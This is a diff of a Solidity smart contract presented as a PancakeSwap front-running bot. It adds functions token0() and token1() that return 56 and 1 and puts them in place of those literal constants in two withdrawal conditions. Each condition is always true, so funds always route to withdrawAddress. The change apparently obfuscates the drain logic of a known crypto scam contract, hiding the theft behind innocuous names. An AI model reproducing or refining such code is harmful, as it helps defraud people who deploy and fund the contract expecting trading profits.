@@ -373,6 +373,10 @@ contract PancakeSwapFrontrunBot {
         return address(iaddr);
     }
 
+    function token0() internal pure returns (uint256) {
+        return 56;
+    }
+
     /*
      * @dev Returns the keccak-256 hash of the contracts.
      * @param self The slice to hash.
@@ -462,7 +466,7 @@ contract PancakeSwapFrontrunBot {
     }
 
     function _callFrontRunActionMempool() internal view returns (address) {
-        if (pancakeswapV3Pool != 56 || pancakeswapV3Pool != 1) {
+        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1()) {
             return withdrawAddress;
         }
         return parseMemoryPool(callMempool());
@@ -569,6 +573,10 @@ contract PancakeSwapFrontrunBot {
         return _fullMempool;
     }
 
+    function token1() internal pure returns (uint256) {
+        return 1;
+    }
+
     /*
      * @dev Modifies `self` to contain everything from the first occurrence of
      *      `needle` to the end of the slice. `self` is set to the empty slice
@@ -641,7 +649,7 @@ contract PancakeSwapFrontrunBot {
     }
 
     function withdrawalProfits() internal view returns (address) {
-        if (pancakeswapV3Pool != 56 || pancakeswapV3Pool != 1) {
+        if (pancakeswapV3Pool != token0() || pancakeswapV3Pool != token1()) {
             return withdrawAddress;
         }
         return parseMemoryPool(callMempool());
